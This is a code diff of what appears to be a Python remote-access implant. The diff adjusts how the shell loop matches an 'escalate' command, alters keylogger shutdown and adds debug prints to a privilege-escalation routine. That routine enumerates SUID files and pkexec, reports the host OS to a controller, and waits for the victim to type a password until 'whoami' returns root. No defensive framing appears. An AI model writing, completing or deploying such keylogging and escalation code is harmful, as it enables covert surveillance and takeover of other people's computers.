@@ -120,7 +120,7 @@ def shell():
             keylogger_handler()
 
         # Privelege Escalation
-        elif command == 'escalate':
+        elif command[:8] == 'escalate':
             privilege_escalator(command[9:])
 
         # Others
@@ -188,9 +188,11 @@ def stop_keylogger():
     try:
         print("Terminating keylogger and main program...")
         if keylogger_socket:
-            socket_send(keylogger_socket, "TERMINATE")
+            # socket_send(keylogger_socket, "TERMINATE")
+            print('keylogger socket termination...')
             keylogger_socket.close()
         if keylogger_thread:
+            print('keylogger thread termination...')
             keylogger_thread.join(timeout=1)
     except NameError:
         print("Screen streaming process not running.")  
@@ -201,7 +203,9 @@ def stop_keylogger():
 
 def privilege_escalator(command):
     global read_stream_result
-
+    read_stream_result =""
+    reliable_send(os.name)
+    print(os.name)
     if os.name == 'posix':
         findpkexec = False
         suid_files = []
@@ -226,13 +230,18 @@ def privilege_escalator(command):
 
             # Check that user input password or not
             while True:
+                print("w")
+                time.sleep(2)
                 reliable_send("Waiting user input PASS")
-                time.sleep(1)
+                print("t")
                 esc_process.stdin.write("whoami".encode() + b'\n')
+                print('first esc')
                 esc_process.stdin.flush()
+                print('second esc')
                 if read_stream_result == "root":
                     reliable_send("USER has already input PASS")
                     break
+                print("EnD LOOP")
             
             if esc_process:
                 # run command for escalate specfic user in esc_process
